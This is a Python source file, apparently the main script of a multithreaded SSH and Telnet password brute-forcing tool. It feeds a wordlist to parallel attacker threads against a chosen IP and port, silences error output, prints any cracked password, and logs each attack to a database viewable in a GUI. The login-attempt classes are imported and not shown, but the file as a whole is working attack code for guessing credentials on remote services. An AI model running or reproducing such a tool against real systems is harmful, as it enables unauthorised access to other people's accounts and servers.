import sys
from argparser import argparse
from ssh_attack import SSHAttacker
from telnet_attack import TelnetAttacker
from dbGUI import Attack, init_database, start_GUI
from datetime import datetime
from target import Target

if __name__ == '__main__':

    portmap = {"ssh": 22, "telnet": 23}
    (options, ip_addr, service) = argparse(sys.argv, portmap)

    if options.history is True:
        session = init_database()
        start_GUI(session)
        sys.exit(0)

    target = Target(
        ip_addr,
        portmap[service],
        options.login,
        options.wordlist,
        options.threads
    )

    f = open('/dev/null', 'w')
    sys.stderr = f

    attackers = []
    for i in range(0, options.threads):
        if service == "ssh":
            attacker = SSHAttacker(target)
            AttackerClass = SSHAttacker
        elif service == "telnet":
            attacker = TelnetAttacker(target)
            AttackerClass = TelnetAttacker

        attackers.append(attacker)
    for attacker in attackers:
        attacker.start()

    try:
        passw_counter = 0
        with open(target.wordlist) as passwords:
            while AttackerClass.finish is False:
                if target.queue_empty():
                    # fill the queue if it is empty and check for EOF
                    passw_put = target.queue_fill(passwords)
                    if passw_put is None:
                        break
                    else:
                        passw_counter += passw_put
            # wait for other threads to try all passwords
            while passw_counter != (sum(attacker.tries for attacker in attackers)) and AttackerClass.finish is False:
                pass
    except (SystemExit, KeyboardInterrupt):
        print("KeyboardInterrupt received, quitting...")
    finally:
        AttackerClass.finish = True
        for attacker in attackers:
            attacker.join()

    print("\n-=-=-=-=-=  STATISTICS =-=-=-=-=-=-")
    print("Successful: %s" % ("YES" if AttackerClass.success else "NO"))
    print("IP addr: %s" % (ip_addr))
    print("Service: %s" % (service))
    print("Port: %d" % (target.port))
    print("Username: %s" % (target.login))
    print("Password: %s" % ("?" if not AttackerClass.success else AttackerClass.password))
    print("Total attempts: %d" % (sum(attacker.tries for attacker in attackers)))
    print("-=-=-=-=-=-=-=-=-=-=-=-=--==-=-=-=-")

    if options.nostore is False:
        attack = Attack(
            end_time=datetime.now(),
            successful=AttackerClass.success,
            ip=ip_addr,
            service=service,
            port=target.port,
            login=target.login,
            password=(None if not AttackerClass.success else AttackerClass.password),
            total_tries=sum(attacker.tries for attacker in attackers)
        )
        session = init_database()
        session.add(attack)
        session.commit()
